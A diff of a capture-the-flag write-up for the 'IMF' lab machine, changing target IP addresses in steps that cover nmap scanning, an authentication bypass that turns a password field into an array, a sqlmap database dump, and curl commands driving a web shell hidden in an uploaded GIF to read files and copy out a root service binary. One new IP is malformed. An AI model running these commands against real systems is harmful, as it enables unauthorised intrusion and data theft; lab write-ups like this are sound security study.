@@ -8,13 +8,13 @@ title: imf
 ##Finding machine on the network:
 
 ###Nmap
-nmap -sn 192.168.1.0/24
+nmap -sn 172.16.161.129/24
 
-Scan for hosts on my local network (192.168.1.1) which gave me a machine named "imf"
+Scan for hosts on my local network which gave me a machine named "imf"
 
 Now to run nmap on the machine itself:
 
-nmap -Pn -oA imf-nmap-results -p 0-65525 192.168.1.21
+nmap -Pn -oA imf-nmap-results -p 0-65525 172.16.161.129
 
 Looks like port 80 is open.
 
@@ -46,7 +46,7 @@ I get:
 
 imfadministrator
 
-I tried browsing to: http://192.168.1.21/imfadministrator
+I tried browsing to: http://172.16.161.129/imfadministrator
 
 Loads up a login page, upon viewing the page source I find:
 
@@ -59,7 +59,7 @@ Trying the user it seems the user is valid.
 After some googling, looks like there is a potential authentication type conversion that might get us around authentication.  Looking at a post changing the type of the data that is received server side could bypass authentication.  Intercepting the HTTP post with burp and changing pass to pass[], this ends up sending an array down to the server instead of a string, improper handling of the input must be how we can get past it.  Once the post is forwarded another flag: flag3{Y29udGludWVUT2Ntcw==} which decodes to: continueTOcms
 
 
-sqlmap --url http://192.168.1.21/imfadministrator/cms.php?pagename=home --threads 5 --level 5 --cookie="PHPSESSID=phpsessionid" --dbms=MYSQL --dump
+sqlmap --url http://172.16.161.129/imfadministrator/cms.php?pagename=home --threads 5 --level 5 --cookie="PHPSESSID=phpsessionid" --dbms=MYSQL --dump
 
 Important to remember the last two parameters, I missed these originally and totally didn't get some output for moving forward from the command line.
 
@@ -78,16 +78,16 @@ No luck though when trying to hit the interesting ports.
 
 Trying to hit port 7788:
 
-curl http://192.168.1.20/imfadministrator/uploads/c59ca80d5d76.gif?c=nc localhost 7788
+curl http://172.16.161.129/imfadministrator/uploads/c59ca80d5d76.gif?c=nc localhost 7788
 
 I get a little shell app. Given that we are investigating "agentservice" I do a find on agent:
 
-curl http://192.168.1.20/imfadministrator/uploads/c59ca80d5d76.gif?c=find%20/%20-name%20%22(asterisk)agent%22
+curl http://172.16.161.129/imfadministrator/uploads/c59ca80d5d76.gif?c=find%20/%20-name%20%22(asterisk)agent%22
 
 Which found:
 /etc/xinetd.d/agent
 
-curl http://192.168.1.20/imfadministrator/uploads/c59ca80d5d76.gif?c=cat%20/etc/xinetd.d/agent
+curl http://172.16.161.129/imfadministrator/uploads/c59ca80d5d76.gif?c=cat%20/etc/xinetd.d/agent
 
 Gets:
 
@@ -107,7 +107,7 @@ service agent
 
 Looks like /usr/local/bin/agent is a service running.
 
-curl -v http://192.168.0.14/imfadministrator/uploads/c59ca80d5d76.gif?c=ls%20-latr%20/usr/local/bin/agent
+curl -v http://172.16.161.1.129/imfadministrator/uploads/c59ca80d5d76.gif?c=ls%20-latr%20/usr/local/bin/agent
 
 -rwxr-xr-x 1 root root 11896 Oct 12 22:39 /usr/local/bin/agent
 
@@ -115,7 +115,7 @@ The service runs as root, possibly a way in
 
 In order to get a look at the binary I base64 encoded the file contents and saved it to a file locally:
 
-curl -v http://192.168.0.14/imfadministrator/uploads/c59ca80d5d76.gif?c=base64%20-w%200%20/usr/local/bin/agent
+curl -v http://172.16.161.129/imfadministrator/uploads/c59ca80d5d76.gif?c=base64%20-w%200%20/usr/local/bin/agent
 
 Then decoded it locally:
 
